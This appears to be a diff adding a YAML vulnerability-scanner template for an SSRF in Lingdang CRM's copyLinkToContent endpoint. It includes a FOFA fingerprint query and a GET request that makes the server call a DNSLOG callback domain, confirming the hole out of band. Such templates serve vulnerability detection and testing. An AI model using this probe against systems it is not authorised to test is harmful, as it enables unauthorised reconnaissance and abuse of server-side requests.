@@ -1,0 +1,23 @@
+id: poc-yaml-51mis-crm-copylinktocontent-ssrf
+info:
+  name: 灵当CRM copyLinkToContent SSRF漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - ssrf
+  finger: 灵当CRM
+  fofa: body="http://localhost:8088/crm/index.php"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /crm/WeiXinApp/marketing/index.php?module=Articles&action=copyLinkToContent&url=https://{{.domain}}
+  expression: 'status_code == 200 &&
+
+    body == " 文章不存在" &&
+
+    reverse.Verify()
+
+    '
+transport: http
